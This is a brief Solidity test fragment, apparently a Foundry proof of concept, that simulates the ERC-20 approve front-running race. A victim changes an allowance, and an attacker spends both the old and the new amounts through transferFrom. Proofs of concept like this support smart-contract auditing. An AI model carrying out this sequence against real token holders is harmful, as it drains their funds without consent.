interface_arsenal:
interface ITouch {
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

attack_sequence:
// 1. Victim grants initial approval
vm.prank(victim);
token.approve(attacker, initialAllowance);

// 2. Attacker front-runs the allowance change, spending the initial amount.
// This simulates a high-gas transaction executed before the victim's next txs.
token.transferFrom(victim, attacker, initialAllowance);

// 3. Victim's transactions to reset and set a new allowance are mined.
vm.prank(victim);
token.approve(attacker, 0);
vm.prank(victim);
token.approve(attacker, newAllowance);

// 4. Attacker spends the newly granted allowance.
token.transferFrom(victim, attacker, newAllowance);
